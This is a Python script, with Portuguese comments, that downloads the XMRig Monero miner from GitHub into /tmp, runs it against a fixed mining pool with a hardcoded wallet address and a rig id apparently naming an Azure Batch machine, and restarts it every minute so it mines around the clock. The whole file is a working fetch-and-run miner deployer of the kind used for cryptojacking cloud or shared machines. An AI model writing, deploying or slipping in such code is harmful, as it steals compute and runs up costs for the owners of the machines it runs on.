import requests
import subprocess
import os
import urllib.request
import tarfile
import platform
import time

def get_latest_xmrig_release_url():
    api_url = "https://api.github.com/repos/xmrig/xmrig/releases/latest"
    response = requests.get(api_url)
    response.raise_for_status()
    release_data = response.json()

    # Encontra o link de download correto para Linux estático
    for asset in release_data['assets']:
        if "linux-static-x64.tar.gz" in asset['name']:
            return asset['browser_download_url']

    raise Exception("Link de download do xmrig não encontrado para Linux.")

def download_and_extract_xmrig():
    download_url = get_latest_xmrig_release_url()
    tar_path = "/tmp/xmrig.tar.gz"
    extract_path = "/tmp/xmrig"

    # Download do arquivo tar.gz
    print(f"Baixando o xmrig de {download_url}...")
    urllib.request.urlretrieve(download_url, tar_path)

    # Extração do arquivo tar.gz
    print("Extraindo o xmrig...")
    with tarfile.open(tar_path, 'r:gz') as tar_ref:
        tar_ref.extractall(extract_path)

    # Caminho do binário extraído (pode variar, ajuste conforme necessário)
    miner_path = os.path.join(extract_path, 'xmrig-6.22.2/xmrig')  # Certifique-se do caminho correto
    os.chmod(miner_path, 0o755)  # Tornar executável no Linux/Unix

    return miner_path

def start_mining(miner_path, wallet_address, pool_address, machine_name):
    miner_command = [
        miner_path,
        "-o", pool_address,
        "-u", wallet_address,
        "-k",
        "--tls",
        "--rig-id", machine_name
    ]

    try:
        print("Iniciando o processo de mineração...")
        process = subprocess.Popen(miner_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return process

    except Exception as e:
        print(f"Erro ao iniciar o minerador: {e}")
        return None

def main():
    wallet_address = "87ULnjRqE9J4UdJ6NsGoyiDDtvMa4c1frGbSeoNg7xfvTwgbkJEKn8s8GgjFhmGXuiUKWG1FrGCvpiy4rBqsJV6Q95JVDRX"
    pool_address = "xmr.kryptex.network:8888"
    machine_name = "AZ-BATCH-1"

    miner_path = download_and_extract_xmrig()

    process = start_mining(miner_path, wallet_address, pool_address, machine_name)

    # Manter a mineração 24 horas por dia com reinício em caso de falhas
    while True:
        if process.poll() is not None:
            print("O minerador parou. Reiniciando...")
            process = start_mining(miner_path, wallet_address, pool_address, machine_name)

        time.sleep(60)  # Verifica o status a cada 1 minuto

if __name__ == "__main__":
    main()
